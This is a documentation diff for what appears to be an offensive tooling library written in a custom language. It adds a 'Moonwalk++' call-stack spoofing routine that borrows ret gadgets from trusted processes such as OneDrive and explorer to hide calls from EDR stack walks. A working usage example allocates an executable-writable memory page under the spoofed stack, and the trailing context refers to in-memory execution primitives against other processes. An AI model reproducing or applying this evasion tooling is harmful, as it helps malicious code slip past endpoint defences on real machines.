@@ -409,7 +409,112 @@ ffi jocky_spoof_syscall(i32, i64, i64, i64, i64) -> i64;
 
 ---
 
+### `jocky_find_trusted_pid(candidates, n_candidates) -> u32`
+
+Scan the running process list for the first match from `candidates[]`.  Uses
+`CreateToolhelp32Snapshot` — no suspicious handle opens required.
+
+Default search order (used when `candidates` is `NULL`):
+
+| Priority | Process |
+|---|---|
+| 1 | `OneDrive.exe` |
+| 2 | `RuntimeBroker.exe` |
+| 3 | `sihost.exe` |
+| 4 | `SearchHost.exe` |
+| 5 | `explorer.exe` |
+| 6 | `svchost.exe` |
+
+```
+ffi jocky_find_trusted_pid(i8**, i32) -> i32;
+```
+
+---
+
+### `jocky_trusted_spoof_call(target_fn, trusted_pid, candidates, n, a1..a4) -> i64`  *(Moonwalk++)*
+
+**Full synthetic call stack** sourced from a trusted process image — every
+return address visible to `RtlWalkFrameChain` is a real `ret` gadget (0xC3)
+inside a locally-mapped copy of the trusted process's `.text` section.
+
+#### Technique
+
+| Step | What happens |
+|---|---|
+| 1 | `jocky_find_trusted_pid()` → choose host (OneDrive etc.) |
+| 2 | `OpenProcess(PROCESS_VM_READ)` → `ReadProcessMemory` copies `.text` |
+| 3 | `VirtualAlloc(PAGE_EXECUTE_READWRITE)` stores the copy locally |
+| 4 | Scan copy for `ret; int3` (0xC3 0xCC) gadgets — collect 4+ |
+| 5 | Dynamically build trampoline stub that places gadget addresses on stack |
+| 6 | JMP to `target_fn` (args forwarded via rcx/rdx/r8/r9) |
+| 7 | `VirtualFree` stub + copy after `target_fn` returns |
+
+#### Call stack seen by EDR / `RtlWalkFrameChain`
+
+```
+target_fn  (e.g. NtAllocateVirtualMemory)
+  ← OneDrive.exe!<ret gadget @ +0x????> — in locally-mapped .text copy
+  ← OneDrive.exe!<ret gadget @ +0x????> — each is a real 0xC3 byte
+  ← OneDrive.exe!<ret gadget @ +0x????>
+  ← OneDrive.exe!<ret gadget @ +0x????>
+  ← (our real return address — buried 4 frames deep)
+```
+
+#### CPU execution chain (when `target_fn` does its RET)
+
+```
+target_fn RETs → gadget0 (0xC3 = ret) → gadget1 (ret) → gadget2 (ret)
+             → gadget3 (ret) → real_return_addr (our code) ✓
+```
+
+#### Fallback
+
+If the trusted process is unavailable or yields fewer than 2 gadgets,
+automatically falls back to `jocky_spoof_call()` (single ntdll frame).
+
+```
+ffi jocky_trusted_spoof_call(i8*, i32, i8**, i32, i64, i64, i64, i64) -> i64;
+```
+
+#### Usage example
+
+```jky
+ffi jocky_find_trusted_pid(i8**, i32) -> i32;
+ffi jocky_trusted_spoof_call(i8*, i32, i8**, i32,
+                              i64, i64, i64, i64)   -> i64;
+ffi NtAllocateVirtualMemory(i8*, i8**, i64,
+                             i64*, i32, i32)          -> i32;
+
+fn main() -> void {
+    // Option A: fully automatic — picks OneDrive/RuntimeBroker/etc.
+    let pid: i32 = 0;
+
+    // Option B: specific trusted process
+    // let pid: i32 = jocky_find_trusted_pid(null, 0);
+
+    let base: i8* = null;
+    let size: i64 = 0x1000;
+
+    // NtAllocateVirtualMemory(-1, &base, 0, &size,
+    //     MEM_COMMIT|MEM_RESERVE=0x3000, PAGE_EXECUTE_READWRITE=0x40)
+    // ... called with all 4 return addresses on stack pointing to OneDrive
+    let st: i32 = jocky_trusted_spoof_call(
+        NtAllocateVirtualMemory,   // target
+        pid,                       // trusted pid (0 = auto)
+        null, 0,                   // candidates (null = built-in list)
+        -1,                        // a1: process handle (current)
+        &base,                     // a2: base address out
+        0,                         // a3: zero bits
+        &size                      // a4: region size
+    );
+    // st == 0 → success; base points to allocated RWX page
+}
+```
+
+---
+
 ## 6  Execution  *(Windows only)*
+
 
 Five complementary in-memory execution primitives.  All require
 `PROCESS_ALL_ACCESS` on the target (i.e., elevated privileges or a
